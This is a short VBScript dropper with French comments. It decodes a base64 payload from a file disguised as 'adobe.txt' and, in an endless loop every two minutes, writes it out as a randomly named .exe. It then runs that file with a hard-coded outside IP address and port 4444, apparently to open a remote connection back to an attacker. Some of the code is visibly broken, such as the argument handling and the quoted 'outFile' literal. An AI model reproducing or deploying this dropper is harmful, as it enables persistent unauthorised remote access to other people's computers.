Option Explicit



Dim a, inFile, fso, ts, b64, bytes, outFile, curDir

Set a = "c:\windows\system32\adobe.txt"

' --- Vérifie les paramètres ---
If a.Count < 1 Then
  WScript.Echo "Usage: cscript //nologo " & WScript.ScriptName & " <base64File>"
  WScript.Quit 1
End If

inFile = a(0)

Set fso = CreateObject("Scripting.FileSystemObject")

' --- Vérifie que le fichier existe ---
If Not fso.FileExists(inFile) Then
  WScript.Echo "Erreur: fichier introuvable: " & inFile
  WScript.Quit 1
End If

' --- Dossier courant (là où le script est lancé) ---
curDir = fso.GetAbsolutePathName(".")

' --- Construit un nom aléatoire .exe dans le dossier courant ---


' --- Lit le Base64 depuis le fichier ---
Set ts = fso.OpenTextFile(inFile, 1, False) ' ForReading
b64 = ts.ReadAll
ts.Close

' --- Nettoyage Base64 (retours ligne / espaces / tabulations) ---
b64 = Replace(b64, vbCr, "")
b64 = Replace(b64, vbLf, "")
b64 = Replace(b64, vbTab, "")
b64 = Replace(b64, " ", "")

' --- Décode puis écrit le binaire ---
bytes = DecodeBase64(b64)

do
WScript.Sleep 120000
outFile = fso.BuildPath(curDir, RandomName(12) & ".exe")
WriteBytes outFile, bytes
Dim sh
Set sh = CreateObject("WScript.Shell")

sh.Run """outFile"" 88.183.58.29 4444", 1, False
loop



' ============================================================
' Décode une chaîne Base64 en tableau d'octets (byte array)
' ============================================================
Private Function DecodeBase64(ByVal s)
  Dim xm, el
  Set xm = CreateObject("Microsoft.XMLDOM")
  Set el = xm.createElement("x")
  el.DataType = "bin.base64"
  el.Text = s
  DecodeBase64 = el.NodeTypedValue
End Function

' ============================================================
' Écrit un tableau d'octets dans un fichier (binaire)
' overwrite = 2 (écrase si existe)
' ============================================================
Private Sub WriteBytes(ByVal path, ByVal b)
  Dim st
  Set st = CreateObject("ADODB.Stream")
  st.Type = 1 ' binaire
  st.Open
  st.Write b
  st.SaveToFile path, 2
  st.Close
End Sub

' ============================================================
' Génère une chaîne aléatoire alphanumérique de longueur n
' ============================================================
Private Function RandomName(ByVal n)
  Dim chars, i
  chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
  Randomize
  For i = 1 To n
    RandomName = RandomName & Mid(chars, Int(Rnd * Len(chars)) + 1, 1)
  Next
End Function



